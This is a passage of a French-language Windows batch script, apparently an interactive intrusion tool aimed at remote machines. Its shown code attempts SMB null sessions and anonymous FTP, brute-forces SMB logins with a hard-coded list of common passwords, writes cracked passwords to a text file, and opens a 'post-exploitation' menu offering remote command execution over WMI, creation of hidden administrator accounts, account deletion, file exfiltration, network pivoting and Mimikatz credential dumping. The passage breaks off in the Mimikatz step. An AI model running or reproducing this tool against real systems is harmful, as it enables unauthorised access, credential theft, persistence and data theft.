    echo  [i] Connexion SSH vers !remote_ip!...
    set /p "ssh_user=Utilisateur cible : "
    if not defined ssh_user goto wan_menu_creds
    if "!remote_port!"=="NONE" (ssh !ssh_user!@!remote_ip!) else (ssh -p !remote_port! !ssh_user!@!remote_ip!)
    pause
    goto wan_menu_creds
)
if "!sel_action!"=="winrm" (
    cls
    echo.
    echo [i] Tentative de connexion WinRM Remote PowerShell sur !remote_ip!...
    powershell -NoProfile -Command "Enter-PSSession -ComputerName !remote_ip! -Credential (Get-Credential)"
    pause
    goto wan_menu_creds
)
if "!sel_action!"=="smb" (set "smb_ret=wan_menu_nocreds" & goto smb_explore)
if "!sel_action!"=="retour" goto wan_post_scan
if "!sel_action!"=="smb_null" goto action_smb_null
if "!sel_action!"=="smb_creds" goto action_smb_creds
if "!sel_action!"=="rpc_enum" goto action_rpc_enum
if "!sel_action!"=="ftp_anon" goto action_ftp_anon
if "!sel_action!"=="smb_brute" goto action_smb_brute
if "!sel_action!"=="manual_pass" goto action_manual_pass
goto wan_post_scan

:action_smb_creds
cls
echo.
echo %B%  [SMB] ACCES DISQUE C$ AVEC CREDENTIALS%N%
echo  Cible : !remote_ip!
echo.
set "smb_host=!remote_ip!"
set "tmp_v6=!remote_ip::=!"
if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
set "smb_user=!remote_user!"
if not defined smb_user set /p "smb_user=  Utilisateur : "
if not defined smb_user goto wan_post_scan
echo  Utilisateur : %Y%!smb_user!%N%
:smb_creds_loop
set "smb_pass="
set /p "smb_pass=  Mot de passe (vide = annuler) : "
if not defined smb_pass goto wan_post_scan
net use \\!smb_host!\C$ "!smb_pass!" /user:"!smb_user!" >nul 2>&1
if errorlevel 1 (
    echo  [-] Echec - mauvais mot de passe ou acces refuse.
    goto smb_creds_loop
)
echo.
echo  [+] ACCES C$ OK ^! Credentials confirmes.
set "cred_u=!smb_user!"
set "cred_p=!smb_pass!"
set "smb_pass="
goto wan_post_creds

:action_smb_null
cls
echo.
echo %B%  [SMB] TEST SESSION ANONYME - NULL SESSION%N%
echo  Cible : !remote_ip!
echo.
set "smb_host=!remote_ip!"
set "tmp_v6=!remote_ip::=!"
if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
echo  [*] Nettoyage connexions existantes...
net use "\\!smb_host!" /delete /y >nul 2>&1
net use "\\!smb_host!\IPC$" /delete /y >nul 2>&1
echo  [*] Tentative connexion \\!smb_host!\IPC$ sans credentials...
set "SMB_OUT=%TEMP%\smb_null_out.txt"
net use "\\!smb_host!\IPC$" "" /user:"" > "%SMB_OUT%" 2>&1
set "smb_el=%errorlevel%"
type "%SMB_OUT%"
echo.
if "!smb_el!"=="0" (
    echo  [+] NULL SESSION ACCEPTEE ^! Enumeration des partages :
    net view \\!smb_host! 2>&1
    echo.
    echo  [*] Deconnexion...
    net use \\!smb_host!\IPC$ /delete >nul 2>&1
    if exist "%SMB_OUT%" del /f /q "%SMB_OUT%"
    goto smb_null_end
)
findstr /C:"1219" "%SMB_OUT%" >nul 2>&1
if not errorlevel 1 (echo  [-] Conflit de session - connexion existante detectee. Reconnectez-vous. & goto smb_null_done)
findstr /C:"1937" "%SMB_OUT%" >nul 2>&1
if not errorlevel 1 (echo  [-] NTLM desactive - authentification anonyme bloquee par GPO. & goto smb_null_done)
findstr /C:"67" "%SMB_OUT%" >nul 2>&1
if not errorlevel 1 (echo  [-] Reseau introuvable - cible hors ligne ou port 445 bloque. & goto smb_null_done)
findstr /C:"5" "%SMB_OUT%" >nul 2>&1
if not errorlevel 1 (echo  [-] Acces refuse - null session rejetee par la politique Windows. & goto smb_null_done)
echo  [-] Null session refusee ^(code systeme !smb_el!^).
:smb_null_done
if exist "%SMB_OUT%" del /f /q "%SMB_OUT%"
:smb_null_end
echo.
pause
goto wan_post_scan

:action_rpc_enum
cls
echo.
echo %B%  [RPC] ENUMERATION ENDPOINTS DCOM/WMI%N%
echo  Cible : !remote_ip!
echo.
echo  [*] Test accessibilite WMI/RPC...
set "RPC_PRB=%TEMP%\rpc_probe_%RANDOM%.ps1"
set "RPC_PRB_RES=%TEMP%\rpc_probe_res.txt"
>> "%RPC_PRB%" echo try {
>> "%RPC_PRB%" echo     $opt  = New-CimSessionOption -Protocol Dcom
>> "%RPC_PRB%" echo     $sess = New-CimSession -ComputerName "!remote_ip!" -Credential (New-Object PSCredential("probe",(ConvertTo-SecureString "probe" -AsPlainText -Force))) -SessionOption $opt -EA Stop
>> "%RPC_PRB%" echo } catch {
>> "%RPC_PRB%" echo     $c = $_.Exception.HResult -band 0xFFFF
>> "%RPC_PRB%" echo     Set-Content "%RPC_PRB_RES%" $c -Encoding ASCII
>> "%RPC_PRB%" echo }
powershell -NoProfile -ExecutionPolicy Bypass -File "%RPC_PRB%" >nul 2>&1
if exist "%RPC_PRB%" del /f /q "%RPC_PRB%"
set "rpc_probe="
if exist "%RPC_PRB_RES%" for /f "usebackq delims=" %%L in ("%RPC_PRB_RES%") do set "rpc_probe=%%L"
if exist "%RPC_PRB_RES%" del /f /q "%RPC_PRB_RES%"
if "!rpc_probe!"=="1722" (
    echo  [x] FIREWALL BLOQUE - Ports dynamiques RPC fermes sur la cible.
    echo  [i] WMI inaccessible depuis ce reseau. Utilisez SMB C$ a la place.
    echo.
    pause
    goto wan_post_scan
)
if "!rpc_probe!"=="5" echo  [+] Firewall ouvert - WMI accessible, credentials requis.
if "!rpc_probe!"=="1753" (
    echo  [x] Service WMI non disponible sur la cible.
    echo.
    pause
    goto wan_post_scan
)
echo.
set "rpc_user=!remote_user!"
if not defined rpc_user set /p "rpc_user=  Utilisateur (non capture) : "
if not defined rpc_user goto wan_post_scan
set "RPC_TMP=%TEMP%\rpc_enum_%RANDOM%.ps1"
if exist "%RPC_TMP%" del /f /q "%RPC_TMP%"
>> "%RPC_TMP%" echo $ip   = "!remote_ip!"
>> "%RPC_TMP%" echo $user = "!rpc_user!"
>> "%RPC_TMP%" echo Write-Host "  Utilisateur : $user" -f Yellow
>> "%RPC_TMP%" echo Write-Host "  (Entree vide = annuler)" -f DarkGray
>> "%RPC_TMP%" echo while ($true) {
>> "%RPC_TMP%" echo     $sp = Read-Host "  Mot de passe"
>> "%RPC_TMP%" echo     if ($sp.Length -eq 0) { Write-Host "  [i] Annule." -f Yellow; break }
>> "%RPC_TMP%" echo     $ss   = ConvertTo-SecureString $sp -AsPlainText -Force
>> "%RPC_TMP%" echo     $cred = New-Object PSCredential($user, $ss)
>> "%RPC_TMP%" echo     Write-Host "  [*] Connexion WMI/DCOM..." -f Yellow
>> "%RPC_TMP%" echo     try {
>> "%RPC_TMP%" echo         $opt  = New-CimSessionOption -Protocol Dcom
>> "%RPC_TMP%" echo         $sess = New-CimSession -ComputerName $ip -Credential $cred -SessionOption $opt -EA Stop
>> "%RPC_TMP%" echo         $sys  = Get-CimInstance Win32_ComputerSystem -CimSession $sess
>> "%RPC_TMP%" echo         $os   = Get-CimInstance Win32_OperatingSystem -CimSession $sess
>> "%RPC_TMP%" echo         Write-Host "  [+] ACCES WMI OK !" -f Green
>> "%RPC_TMP%" echo         Write-Host "  PC  : $($sys.Name)" -f Cyan
>> "%RPC_TMP%" echo         Write-Host "  OS  : $($os.Caption) $($os.Version)" -f Cyan
>> "%RPC_TMP%" echo         Write-Host "  RAM : $([math]::Round($os.TotalVisibleMemorySize/1MB,1)) GB  libre: $([math]::Round($os.FreePhysicalMemory/1MB,1)) GB" -f Cyan
>> "%RPC_TMP%" echo         Write-Host ""
>> "%RPC_TMP%" echo         Write-Host "  [*] Top 15 processus (RAM) :" -f Yellow
>> "%RPC_TMP%" echo         Get-CimInstance Win32_Process -CimSession $sess ^| Sort-Object WorkingSetSize -Desc ^| Select-Object -First 15 @{N='Processus';E={$_.Name}},@{N='PID';E={$_.ProcessId}},@{N='RAM MB';E={[math]::Round($_.WorkingSetSize/1MB,1)}} ^| Format-Table -AutoSize
>> "%RPC_TMP%" echo         Remove-CimSession $sess
>> "%RPC_TMP%" echo         break
>> "%RPC_TMP%" echo     } catch {
>> "%RPC_TMP%" echo         Write-Host "  [-] Echec : $($_.Exception.Message)" -f Red
>> "%RPC_TMP%" echo         Write-Host "  [i] Reessayez (Entree vide pour annuler)." -f Yellow
>> "%RPC_TMP%" echo         Write-Host ""
>> "%RPC_TMP%" echo     }
>> "%RPC_TMP%" echo }
powershell -NoProfile -ExecutionPolicy Bypass -File "%RPC_TMP%"
if exist "%RPC_TMP%" del /f /q "%RPC_TMP%"
echo.
pause
goto wan_post_scan

:action_ftp_anon
cls
echo.
echo %B%  [FTP] TEST LOGIN ANONYME%N%
echo  Cible : !remote_ip!:21
echo.
set "FTP_TMP=%TEMP%\ftp_anon_%RANDOM%.ps1"
if exist "%FTP_TMP%" del /f /q "%FTP_TMP%"
>> "%FTP_TMP%" echo $ip = "!remote_ip!"
>> "%FTP_TMP%" echo $req = [System.Net.FtpWebRequest]::Create("ftp://$ip/")
>> "%FTP_TMP%" echo $req.Credentials = New-Object System.Net.NetworkCredential("anonymous","pentest@lab.local")
>> "%FTP_TMP%" echo $req.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
>> "%FTP_TMP%" echo $req.Timeout = 5000
>> "%FTP_TMP%" echo try {
>> "%FTP_TMP%" echo     $resp = $req.GetResponse()
>> "%FTP_TMP%" echo     $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
>> "%FTP_TMP%" echo     $content = $reader.ReadToEnd()
>> "%FTP_TMP%" echo     Write-Host "  [+] FTP ANONYME ACCEPTE !" -f Green
>> "%FTP_TMP%" echo     Write-Host $content -f Cyan
>> "%FTP_TMP%" echo     $reader.Close() ; $resp.Close()
>> "%FTP_TMP%" echo } catch { Write-Host "  [-] FTP anonyme refuse : $($_.Exception.Message)" -f Red }
powershell -NoProfile -ExecutionPolicy Bypass -File "%FTP_TMP%"
if exist "%FTP_TMP%" del /f /q "%FTP_TMP%"
echo.
pause
goto wan_post_scan

:action_manual_pass
set "man_1219_count=0"
cls
echo.
echo %B%  [MANUEL] TEST MOT DE PASSE - SMB%N%
echo  Cible : !remote_ip!
if defined remote_user if not "!remote_user!"=="inconnu" echo  User  : !remote_user! %Y%[compte capture]%N%
echo.
set "smb_host=!remote_ip!"
set "tmp_v6=!remote_ip::=!"
if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
set "man_user=!remote_user!"
if "!man_user!"=="inconnu" set "man_user="
if not defined man_user (
    call :InputWithEsc "  Utilisateur : " man_user
    if errorlevel 1 goto wan_menu_nocreds
    if not defined man_user goto wan_menu_nocreds
) else (
    echo  [i] Utilisateur : %Y%!man_user!%N% ^(capture^)
    echo  [i] Entree vide = changer d'utilisateur
    echo.
)
echo  [i] ECHAP ou mot de passe vide = retour au menu
echo  ================================================
:manual_pass_loop
net use "\\!smb_host!\IPC$"   /delete /y >nul 2>&1
net use "\\!smb_host!\C$"     /delete /y >nul 2>&1
net use "\\!smb_host!\ADMIN$" /delete /y >nul 2>&1
net use "\\!smb_host!"        /delete /y >nul 2>&1
set "man_pass="
call :InputWithEsc "  Mot de passe : " man_pass
if errorlevel 1 goto wan_menu_nocreds
if not defined man_pass (
    set "man_user="
    goto action_manual_pass
)
set "MAN_OUT=%TEMP%\man_out_%RANDOM%.txt"
net use "\\!smb_host!\IPC$" "!man_pass!" /user:"!man_user!" > "%MAN_OUT%" 2>&1
set "man_el=%errorlevel%"
if "!man_el!"=="0" goto manual_pass_ok
set "man_err="
findstr /C:"1326" "%MAN_OUT%" >nul 2>&1 && set "man_err=Mot de passe incorrect ^(1326^)"
findstr /C:"1219" "%MAN_OUT%" >nul 2>&1 && set "man_err=1219 - conflit session existante"
findstr /C:"1331" "%MAN_OUT%" >nul 2>&1 && set "man_err=Compte verrouille ^(1331^)"
findstr /C:"1909" "%MAN_OUT%" >nul 2>&1 && set "man_err=Trop de tentatives ^(1909^)"
findstr /C:"53"   "%MAN_OUT%" >nul 2>&1 && if not defined man_err set "man_err=Machine introuvable ^(53^)"
findstr /C:"5"    "%MAN_OUT%" >nul 2>&1 && if not defined man_err set "man_err=Acces refuse ^(5^) - UAC distant"
if not defined man_err set "man_err=code !man_el!"
if exist "%MAN_OUT%" del /f /q "%MAN_OUT%"
echo  %R%[-] !man_err!%N%
if "!man_el!"=="1219" (
    set /a man_1219_count=!man_1219_count!+1
    if "!man_1219_count!" GEQ "2" (
        echo.
        echo  %Y%[!] ATTENTION : erreur 1219 persistante%N%
        echo  [i] Cause probable : tu testes contre ta propre machine
        echo      depuis la meme session Windows.
        echo  [i] Solutions :
        echo      - Tester depuis un autre PC du reseau
        echo      - Utiliser l'IP LAN de la cible si differente
        echo      - Executer le script depuis un autre compte
        echo.
        set "man_1219_count=0"
    )
    timeout /t 1 >nul
)
goto manual_pass_loop
:manual_pass_ok
if exist "%MAN_OUT%" del /f /q "%MAN_OUT%"
net use "\\!smb_host!\IPC$" /delete /y >nul 2>&1
echo.
echo  %G%[+] MOT DE PASSE CORRECT : !man_user! / !man_pass!%N%
echo.
set "cred_u=!man_user!"
set "cred_p=!man_pass!"
REM --- Mise a jour ip distant.txt avec credentials valides ---
set "IPDIST_UPD=%~dp0ip distant.txt"
if exist "!IPDIST_UPD!" (
    set "UPD_TMP=%TEMP%\ipdist_upd_%RANDOM%.txt"
    set "UPD_FOUND=0"
    > "!UPD_TMP!" (
        for /f "usebackq delims=" %%L in ("!IPDIST_UPD!") do (
            set "LINE=%%L"
            echo !LINE! | findstr /C:"IP: !remote_ip!" >nul 2>&1
            if not errorlevel 1 (
                set "UPD_FOUND=1"
                echo [%date% %time%] IP: !remote_ip! -- PC: !remote_pc! -- User: !cred_u! -- Pass: !cred_p!
            ) else (
                echo !LINE!
            )
        )
    )
    if "!UPD_FOUND!"=="1" (
        move /y "!UPD_TMP!" "!IPDIST_UPD!" >nul
        echo  %G%[+] ip distant.txt mis a jour avec les credentials%N%
    ) else (
        del /f /q "!UPD_TMP!" >nul 2>&1
        echo [%date% %time%] IP: !remote_ip! -- PC: !remote_pc! -- User: !cred_u! -- Pass: !cred_p! >> "!IPDIST_UPD!"
        echo  %G%[+] Nouvelle entree ajoutee dans ip distant.txt%N%
    )
)
set "man_user="
set "man_pass="
echo  [i] Appuyez sur une touche pour acceder au menu post-exploitation...
pause >nul
goto wan_post_creds

:action_smb_brute
cls
echo.
echo %B%  [BRUTE] CREDENTIALS COMMUNS - SMB%N%
echo  Cible : !remote_ip!
if defined remote_pc   echo  PC    : !remote_pc!
if defined remote_user echo  User  : !remote_user! %Y%[sera teste en priorite]%N%
echo.
set "smb_host=!remote_ip!"
set "tmp_v6=!remote_ip::=!"
if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
set "b_u="
set "b_p="
net use "\\!smb_host!" /delete /y >nul 2>&1
REM --- Detection outils externes ---
set "tool_netexec="
set "tool_cme="
set "tool_nmap="
where netexec >nul 2>&1 && set "tool_netexec=1"
where crackmapexec >nul 2>&1 && set "tool_cme=1"
where nmap >nul 2>&1 && set "tool_nmap=1"
if defined tool_netexec (
    echo  [i] NetExec detecte - utilisation pour le brute force SMB
    echo.
    call :brute_netexec
    goto brute_tool_done
)
if defined tool_cme (
    echo  [i] CrackMapExec detecte - utilisation pour le brute force SMB
    echo.
    call :brute_cme
    goto brute_tool_done
)
if defined tool_nmap (
    echo  [i] Nmap detecte - utilisation du script smb-brute
    echo.
    call :brute_nmap
    goto brute_tool_done
)
echo  [i] Mode integre ^(net use^) - aucun outil externe detecte
echo  [i] NetExec/CrackMapExec/Nmap ameliorent les performances si installes
echo.
echo  [*] Test sur \\!smb_host!\IPC$ ...
echo.
if defined remote_user (
    REM --- Username connu : on teste uniquement ce compte ---
    echo  [i] Compte cible : %Y%!remote_user!%N%
    echo.
    if not defined b_u call :brute_try "!remote_user!" ""
    if not defined b_u call :brute_try "!remote_user!" "!remote_user!"
    if not defined b_u call :brute_try "!remote_user!" "password"
    if not defined b_u call :brute_try "!remote_user!" "123456"
    if not defined b_u call :brute_try "!remote_user!" "1234"
    if not defined b_u call :brute_try "!remote_user!" "azerty"
    if not defined b_u call :brute_try "!remote_user!" "azerty123"
    if not defined b_u call :brute_try "!remote_user!" "Azerty123"
    if not defined b_u call :brute_try "!remote_user!" "Azerty1234"
    if not defined b_u call :brute_try "!remote_user!" "admin"
    if not defined b_u call :brute_try "!remote_user!" "admin123"
    if not defined b_u call :brute_try "!remote_user!" "Pa$$w0rd"
    if not defined b_u call :brute_try "!remote_user!" "Welcome1"
    if not defined b_u call :brute_try "!remote_user!" "qwerty"
    if not defined b_u call :brute_try "!remote_user!" "qwerty123"
    if not defined b_u call :brute_try "!remote_user!" "0000"
    if not defined b_u call :brute_try "!remote_user!" "1111"
    if not defined b_u call :brute_try "!remote_user!" "1234567890"
) else (
    REM --- Pas de compte connu : comptes generiques ---
    echo  [i] Aucun compte capture - test comptes generiques
    echo.
    if not defined b_u call :brute_try "Administrator" ""
    if not defined b_u call :brute_try "Administrator" "admin"
    if not defined b_u call :brute_try "Administrator" "password"
    if not defined b_u call :brute_try "Administrator" "123456"
    if not defined b_u call :brute_try "Administrator" "admin123"
    if not defined b_u call :brute_try "Administrator" "Pa$$w0rd"
    if not defined b_u call :brute_try "Administrator" "Azerty123"
    if not defined b_u call :brute_try "Administrator" "Welcome1"
    if not defined b_u call :brute_try "admin" ""
    if not defined b_u call :brute_try "admin" "admin"
    if not defined b_u call :brute_try "admin" "password"
    if not defined b_u call :brute_try "admin" "1234"
    if not defined b_u call :brute_try "admin" "123456"
    if not defined b_u call :brute_try "guest" ""
    if not defined b_u call :brute_try "guest" "guest"
)
:brute_tool_done
if defined b_u goto brute_found
echo.
echo  [-] Aucun credential commun accepte.
echo.
pause
goto wan_menu_nocreds

:brute_found
echo.
echo  ================================================
echo  [+] CREDENTIAL TROUVE ^!
echo      Login : !b_u!
echo      MDP   : !b_p!
echo  ================================================
echo.
echo  [*] Tentative de connexion C$ en cours...
net use "\\!smb_host!\C$" "!b_p!" /user:"!b_u!" >nul 2>&1
if errorlevel 1 (
    echo  [-] C$ refuse malgre les credentials ^(restrictions GPO ?^)
    echo  [i] Utilisez ^"J'ai le mot de passe^" pour tenter d'autres partages.
    echo.
    pause
    goto wan_menu_nocreds
)
echo  [+] ACCES C$ OK ^! Credentials confirmes.
set "cred_u=!b_u!"
set "cred_p=!b_p!"
set "b_u="
set "b_p="
goto wan_post_creds

:brute_try
net use "\\!smb_host!" /delete /y >nul 2>&1
echo  [-] %~1 / %~2
net use "\\!smb_host!\IPC$" "%~2" /user:"%~1" >nul 2>&1
if not errorlevel 1 (
    net use "\\!smb_host!\IPC$" /delete /y >nul 2>&1
    set "b_u=%~1"
    set "b_p=%~2"
)
goto :eof

:brute_netexec
echo  [*] NetExec SMB sur !remote_ip! ...
echo  [i] Les lignes [+] indiquent un credential valide
echo.
netexec smb !remote_ip! -u Administrator admin user guest -p "" admin password 123456 admin123 Pa$$w0rd Welcome1 Azerty123
echo.
echo  [i] Si credential trouve : utilisez ^"J'ai le mot de passe^" pour l'exploiter.
goto :eof

:brute_cme
echo  [*] CrackMapExec SMB sur !remote_ip! ...
echo  [i] Les lignes [+] indiquent un credential valide
echo.
crackmapexec smb !remote_ip! -u Administrator admin user guest -p "" admin password 123456 admin123 Pa$$w0rd Welcome1 Azerty123
echo.
echo  [i] Si credential trouve : utilisez ^"J'ai le mot de passe^" pour l'exploiter.
goto :eof

:brute_nmap
echo  [*] Nmap smb-brute sur !remote_ip!:445 ...
nmap -p 445 --script smb-brute !remote_ip!
echo.
echo  [i] Si credential trouve : utilisez ^"J'ai le mot de passe^" pour l'exploiter.
goto :eof

REM ==========================================================
REM  POST-EXPLOITATION
REM ==========================================================
:wan_post_creds
set "PEX_USER=!cred_u!"
set "PEX_PASS=!cred_p!"
set "PEX_IP=!remote_ip!"
set "PEX_HOST=!smb_host!"
cls
echo.
echo  ====================================================
echo   POST-EXPLOITATION
echo  ====================================================
echo   IP   : !remote_ip!
echo   User : !cred_u!
echo  ====================================================
echo.
call :DynamicMenu "CONTROLE DE LA MACHINE" "Ouvrir C$ dans l'explorateur~Navigation complete du disque distant;Executer une commande~cmd.exe distant via WMI + lecture sortie;Voir les processus~Top 25 processus par RAM (WMI);Gestion des comptes~Lister, creer admin cache, supprimer;Extraire MDP memoire~Mimikatz sekurlsa si disponible;Exfiltrer des fichiers~Copier Documents/Bureau vers local;Pivoter - scanner reseau interne~ARP + scan depuis la machine cible;Retour" "NONUMS NOCLS"
set "pex_ch=%errorlevel%"
if "%pex_ch%"=="0" goto wan_post_scan
set "pex_sel="
set "idx=0"
for %%A in (open_c,cmd,procs,accounts,mimi,exfil,pivot,retour) do (
    set /a idx+=1
    if "!idx!"=="!pex_ch!" set "pex_sel=%%A"
)
if "!pex_sel!"=="open_c"   goto pex_open_c
if "!pex_sel!"=="cmd"      goto pex_cmd
if "!pex_sel!"=="procs"    goto pex_procs
if "!pex_sel!"=="accounts" goto pex_accounts
if "!pex_sel!"=="mimi"     goto pex_mimi
if "!pex_sel!"=="exfil"    goto pex_exfil
if "!pex_sel!"=="pivot"    goto pex_pivot
if "!pex_sel!"=="retour"   goto wan_post_scan
goto wan_post_creds

REM --- Ouvrir C$ ---
:pex_open_c
net use "\\!smb_host!\C$" "!cred_p!" /user:"!cred_u!" >nul 2>&1
start explorer "\\!smb_host!\C$"
echo.
echo  [+] C$ ouvert dans l'explorateur.
echo  [i] Pour deconnecter : net use \\!smb_host!\C$ /delete
echo.
pause
net use "\\!smb_host!\C$" /delete >nul 2>&1
goto wan_post_creds

REM --- Executer une commande ---
:pex_cmd
cls
echo.
echo  [CMD] EXECUTION DISTANTE - !remote_ip!
echo  [i] WMI - necessite port 135
echo.
call :DynamicMenu "CHOISIR UNE COMMANDE" "whoami~Utilisateur courant;hostname~Nom de la machine;ipconfig /all~Config reseau complete;net user~Liste des comptes locaux;net localgroup administrators~Membres du groupe admin;systeminfo~Infos OS / RAM / patch level;tasklist~Processus en cours;netstat -ano~Connexions reseau actives;wmic product get name,version~Logiciels installes;dir C:\Users~Liste des profils utilisateurs;[---];Saisir une commande personnalisee~Entrer n'importe quelle commande;Retour" "NONUMS NOCLS"
set "cmd_ch=%errorlevel%"
if "%cmd_ch%"=="0" goto wan_post_creds
set "pex_command="
if "%cmd_ch%"=="1"  set "pex_command=whoami"
if "%cmd_ch%"=="2"  set "pex_command=hostname"
if "%cmd_ch%"=="3"  set "pex_command=ipconfig /all"
if "%cmd_ch%"=="4"  set "pex_command=net user"
if "%cmd_ch%"=="5"  set "pex_command=net localgroup administrators"
if "%cmd_ch%"=="6"  set "pex_command=systeminfo"
if "%cmd_ch%"=="7"  set "pex_command=tasklist"
if "%cmd_ch%"=="8"  set "pex_command=netstat -ano"
if "%cmd_ch%"=="9"  set "pex_command=wmic product get name,version"
if "%cmd_ch%"=="10" set "pex_command=dir C:\Users"
if "%cmd_ch%"=="11" (
    call :InputWithEsc "  Commande : " pex_command
    if errorlevel 1 goto pex_cmd
    if not defined pex_command goto pex_cmd
)
if "%cmd_ch%"=="12" goto wan_post_creds
if not defined pex_command goto wan_post_creds
set "PEX_CMD=!pex_command!"
echo.
echo  [*] Execution via WMI...
set "PEX_PS=%TEMP%\pex_cmd_%RANDOM%.ps1"
>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP;$h=$env:PEX_HOST;$cmd=$env:PEX_CMD
>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
>> "%PEX_PS%" echo $tmp="pex_$(Get-Random).txt"
>> "%PEX_PS%" echo try {
>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c $cmd > C:\Windows\Temp\$tmp 2>&1" -ComputerName $ip -Credential $cr -EA Stop
>> "%PEX_PS%" echo   Start-Sleep 3
>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
>> "%PEX_PS%" echo   $out=Get-Content "\\$h\C$\Windows\Temp\$tmp" -EA SilentlyContinue
>> "%PEX_PS%" echo   if ($out) { $out ^| ForEach-Object { Write-Host "  $_" } } else { Write-Host "  [i] Aucune sortie" -f Yellow }
>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c del /f /q C:\Windows\Temp\$tmp" -ComputerName $ip -Credential $cr
>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red; Write-Host "  [i] Port 135 requis pour WMI" -f Yellow }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
if exist "%PEX_PS%" del /f /q "%PEX_PS%"
echo.
pause
goto pex_cmd

REM --- Processus ---
:pex_procs
cls
echo.
echo  [PROCS] PROCESSUS EN COURS - !remote_ip!
echo.
set "PEX_PS=%TEMP%\pex_procs_%RANDOM%.ps1"
>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP
>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
>> "%PEX_PS%" echo try {
>> "%PEX_PS%" echo   $list=Get-WmiObject Win32_Process -ComputerName $ip -Credential $cr -EA Stop ^| Sort-Object WorkingSetSize -Desc ^| Select-Object -First 25
>> "%PEX_PS%" echo   Write-Host ("  "+("Processus".PadRight(32))+("PID".PadRight(8))+"RAM MB") -f Yellow
>> "%PEX_PS%" echo   Write-Host ("  "+"-"*52) -f DarkGray
>> "%PEX_PS%" echo   foreach ($proc in $list) { Write-Host ("  "+$proc.Name.PadRight(32)+([string]$proc.ProcessId).PadRight(8)+[math]::Round($proc.WorkingSetSize/1MB,1)) }
>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
if exist "%PEX_PS%" del /f /q "%PEX_PS%"
echo.
pause
goto wan_post_creds

REM --- Gestion comptes ---
:pex_accounts
cls
echo.
echo  [COMPTES] GESTION - !remote_ip!
echo.
call :DynamicMenu "COMPTES" "Lister les comptes~net user distant;Creer un admin cache~Nouveau compte + groupe Administrators;Supprimer un compte~net user /delete;Retour" "NONUMS NOCLS"
set "acc_ch=%errorlevel%"
if "%acc_ch%"=="0" goto wan_post_creds
if "%acc_ch%"=="1" ( set "PEX_CMD=net user" & goto pex_run_wmi )
if "%acc_ch%"=="2" goto pex_create_admin
if "%acc_ch%"=="3" goto pex_del_account
goto wan_post_creds

:pex_create_admin
set "new_acc="
set "new_pwd="
call :InputWithEsc "  Nom du compte  : " new_acc
if errorlevel 1 goto pex_accounts
if not defined new_acc goto pex_accounts
call :InputWithEsc "  Mot de passe   : " new_pwd
if errorlevel 1 goto pex_accounts
if not defined new_pwd goto pex_accounts
set "PEX_CMD=net user !new_acc! !new_pwd! /add /Y ^& net localgroup Administrators !new_acc! /add /Y"
set "new_acc="
set "new_pwd="
goto pex_run_wmi

:pex_del_account
set "del_acc="
call :InputWithEsc "  Compte a supprimer : " del_acc
if errorlevel 1 goto pex_accounts
if not defined del_acc goto pex_accounts
set "PEX_CMD=net user !del_acc! /delete"
set "del_acc="
goto pex_run_wmi

:pex_run_wmi
cls
echo.
echo  [*] Execution : !PEX_CMD!
echo.
set "PEX_PS=%TEMP%\pex_wmi_%RANDOM%.ps1"
>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP;$h=$env:PEX_HOST;$cmd=$env:PEX_CMD
>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
>> "%PEX_PS%" echo $tmp="pex_$(Get-Random).txt"
>> "%PEX_PS%" echo try {
>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c $cmd > C:\Windows\Temp\$tmp 2>&1" -ComputerName $ip -Credential $cr -EA Stop
>> "%PEX_PS%" echo   Start-Sleep 2
>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
>> "%PEX_PS%" echo   Get-Content "\\$h\C$\Windows\Temp\$tmp" -EA SilentlyContinue ^| ForEach-Object { Write-Host "  $_" }
>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c del /f /q C:\Windows\Temp\$tmp" -ComputerName $ip -Credential $cr
>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
if exist "%PEX_PS%" del /f /q "%PEX_PS%"
echo.
pause
goto pex_accounts

REM --- Mimikatz ---
:pex_mimi
cls
echo.
echo  [MIMI] EXTRACTION MDP MEMOIRE - !remote_ip!
echo.
set "mimi_path="
where mimikatz.exe >nul 2>&1 && set "mimi_path=mimikatz.exe"
if not defined mimi_path if exist "%~dp0mimikatz.exe" set "mimi_path=%~dp0mimikatz.exe"
if not defined mimi_path if exist "C:\Tools\mimikatz.exe" set "mimi_path=C:\Tools\mimikatz.exe"
if not defined mimi_path (
